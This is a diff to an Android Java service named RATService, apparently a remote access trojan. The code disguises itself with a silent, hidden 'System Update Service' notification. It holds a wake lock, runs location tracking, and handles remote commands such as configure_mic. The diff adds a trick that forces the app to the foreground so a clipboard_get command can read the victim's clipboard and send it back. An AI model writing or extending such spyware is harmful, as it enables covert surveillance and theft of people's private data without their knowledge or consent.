@@ -183,18 +183,27 @@ public class RATService extends Service {
     }
     
     private Notification createNotification() {
-        int icon = android.R.drawable.stat_sys_download_done;
-        
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Update Service")
-            .setContentText("Optimizing system performance")
-            .setSmallIcon(icon)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .setSilent(true)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .build();
-    }
+    int icon = android.R.drawable.stat_sys_download_done;
+    
+    NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
+        .setContentTitle("System Update Service")
+        .setContentText("Optimizing system performance")
+        .setSmallIcon(icon)
+        .setPriority(NotificationCompat.PRIORITY_MIN)
+        .setOngoing(true)
+        .setSilent(true)
+        .setVisibility(NotificationCompat.VISIBILITY_SECRET);
+    
+    // Add action to open app
+    Intent intent = new Intent(this, MainActivity.class);
+    PendingIntent pendingIntent = PendingIntent.getActivity(
+        this, 0, intent, 
+        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+    );
+    builder.setContentIntent(pendingIntent);
+    
+    return builder.build();
+}
     
     private void acquireWakeLock() {
         try {
@@ -210,7 +219,17 @@ public class RATService extends Service {
             Log.e(TAG, "Failed to acquire wake lock", e);
         }
     }
-    
+    // Add this method to bring app to foreground
+private void bringAppToForeground() {
+    try {
+        Intent intent = new Intent(this, MainActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+        startActivity(intent);
+        Log.d(TAG, "📱 App brought to foreground");
+    } catch (Exception e) {
+        Log.e(TAG, "Error bringing app to foreground", e);
+    }
+}
     private void startLocationThread() {
         locationThread = new HandlerThread("LocationThread");
         locationThread.start();
@@ -1398,12 +1417,48 @@ case "configure_mic":
                // In routeCommand() method, add these cases:
 
 case "clipboard_get":
-    if (clipboardModule != null) {
-        String result = clipboardModule.getClipboardContent();
-        sendCommand("CLIPBOARD_GET|" + result);
-    } else {
-        sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
+    new Thread(() -> {
+        try {
+            Log.d(TAG, "📋 Processing clipboard_get command");
+            
+            // Step 1: Bring app to foreground
+            bringAppToForeground();
+            
+            // Step 2: Wait for app to become foreground
+            Thread.sleep(300);
+            
+            // Step 3: Try multiple times to get clipboard
+            String result = null;
+            int maxAttempts = 3;
+            
+            for (int i = 0; i < maxAttempts; i++) {
+                if (clipboardModule != null) {
+                    result = clipboardModule.getClipboardContent();
+                    Log.d(TAG, "📋 Attempt " + (i+1) + ": " + result);
+                    
+                    // Check if successful
+                    if (result != null && !result.contains("\"success\":false")) {
+                        break;
+                    }
+                }
+                
+                if (i < maxAttempts - 1) {
+                    Thread.sleep(200); // Wait before retry
+                }
+            }
+            
+            // Step 4: Send response back
+            if (result != null) {
+                sendCommand("CLIPBOARD_GET|" + result);
+            } else {
+                sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"Failed to access clipboard\"}");
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in clipboard_get", e);
+            sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+        }
+    }).start();
     break;
 
 case "clipboard_set":
